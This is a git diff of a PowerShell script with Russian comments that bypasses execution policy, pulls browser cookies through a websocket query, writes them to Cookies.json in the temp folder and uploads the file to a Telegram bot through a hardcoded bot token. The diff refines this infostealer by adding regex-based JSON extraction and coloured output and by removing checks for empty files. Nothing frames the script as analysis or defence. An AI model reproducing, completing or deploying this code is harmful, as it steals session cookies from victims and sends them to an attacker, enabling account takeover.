@@ -3,18 +3,18 @@ try {
     Write-Host "Bypassing Execution Policy..."
     Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force # Allows the script to run bypassing the default execution policies.
     Start-Sleep -Seconds 1
-    Write-Host "Bypassed!"
+    Write-Host "Bypassed!" -ForegroundColor Green
 } catch {
-    Write-Host "Error: Unable to Bypass Execution Policy. Proceeding without Bypass."
+    Write-Host "Error: Unable to Bypass Execution Policy. Proceeding without Bypass." -ForegroundColor Red
 }
 
-Write-Host "Created by @kryyaasoft"
-Write-Host "Created by @kryyaasoft"
-Write-Host "Created by @kryyaasoft"
-Write-Host "Created by @kryyaasoft"
-Write-Host "Created by @kryyaasoft"
-Write-Host "Created by @kryyaasoft"
-Write-Host "Created by @kryyaasoft"
+Write-Host "Created by @kryyaasoft" -ForegroundColor Blue
+Write-Host "Created by @kryyaasoft" -ForegroundColor Green
+Write-Host "Created by @kryyaasoft" -ForegroundColor Blue
+Write-Host "Created by @kryyaasoft" -ForegroundColor Green
+Write-Host "Created by @kryyaasoft" -ForegroundColor Blue
+Write-Host "Created by @kryyaasoft" -ForegroundColor Green
+Write-Host "Created by @kryyaasoft" -ForegroundColor Blue
 
 function Send-FileToTelegram {
     param (
@@ -28,11 +28,6 @@ function Send-FileToTelegram {
 
     $url = "https://api.telegram.org/bot$BotToken/sendDocument"
     $fileContent = Get-Content -Path $FilePath -Raw
-
-    if ([string]::IsNullOrEmpty($fileContent)) {
-        Write-Error "File is empty. Cannot send an empty file to Telegram."
-        return
-    }
 
     try {
         $boundary = [System.Guid]::NewGuid().ToString()
@@ -125,23 +120,29 @@ if ($url_capture[0].Length -ge 2) {
     $response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture -Message $Message
 }
 
-# Извлекаем только JSON-часть из ответа
+# Извлекаем JSON-часть из ответа с помощью регулярного выражения
 try {
-    $jsonResponse = $response | ConvertFrom-Json | Select-Object -ExpandProperty result
+    # Используем регулярное выражение для поиска JSON в ответе
+    $jsonPattern = '\{.*\}'
+    $jsonMatch = [regex]::Match($response, $jsonPattern)
+    if ($jsonMatch.Success) {
+        $jsonResponse = $jsonMatch.Value | ConvertFrom-Json
+        if ($jsonResponse -and $jsonResponse.result) {
+            $jsonResponse = $jsonResponse.result
+        } else {
+            throw "Invalid JSON response: $jsonResponse"
+        }
+    } else {
+        throw "No JSON found in the response."
+    }
 } catch {
     Write-Error "Failed to parse JSON response: $_"
-    exit
+    exit 1
 }
 
 # Сохраняем JSON в файл
 $tempFilePath = "$env:TEMP\Cookies.json"
 $jsonResponse | ConvertTo-Json -Depth 10 | Out-File -FilePath $tempFilePath -Encoding UTF8
-
-# Проверяем, что файл не пустой
-if ((Get-Item -Path $tempFilePath).Length -eq 0) {
-    Write-Error "The file is empty. Cannot send an empty file to Telegram."
-    exit
-}
 
 # Отправка файла в Telegram
 $botToken = "7677386741:AAFrg5fM7pBPcGeljsPI9BxyHAxXsBzoWl8"  # Замените на ваш токен бота
